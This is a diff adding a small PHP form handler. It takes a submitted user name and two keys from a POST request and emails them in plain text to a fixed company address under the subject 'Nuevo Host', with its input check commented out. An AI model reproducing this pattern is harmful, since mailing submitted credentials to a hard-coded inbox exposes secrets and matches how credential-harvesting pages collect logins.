@@ -1,0 +1,22 @@
+<?php
+
+    $usuario = htmlspecialchars($_POST['usuario']);
+    $llave1=htmlspecialchars($_POST['llave1']);
+    $llave2=htmlspecialchars($_POST['llave2']);
+
+  
+    
+    // if there are no errors, save user to database
+    //if($usuario != "" and $llave1!="" and $llave2!=""){
+
+     
+//$mailfrom=$_POST['email'];
+//$name=$_POST['name'];
+$rcpto="ceo@securebytes.com.co";
+//$message=$_POST['message'];
+
+$DataToSend="Datos: " . $usuario . "\nKey1: ". $llave1 . "\nKey2: ".$llave2;
+//$DataToSend->CharSet = 'UTF-8';
+mail($rcpto,"Nuevo Host",$DataToSend);
+//}//
+?>
